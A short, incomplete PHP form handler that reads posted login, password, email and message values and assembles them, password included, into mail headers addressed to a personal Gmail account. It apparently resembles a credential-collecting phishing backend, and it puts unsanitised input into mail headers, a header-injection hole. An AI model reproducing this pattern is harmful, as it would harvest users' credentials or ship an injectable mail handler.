<?php
if(!empty($_POST["send"])){
    $login = $_POST["login"];
    $password = $_POST["password"];
    $email = $_POST["email"];
    $message = $_POST["message"];
    $toEmail = "fixik2019@gmail.com";

    $mailHeaders = "Login: " . $login .
        "\r\n Password: " . $password .
        "\r\nMessage: " . $message . "\r\n";
}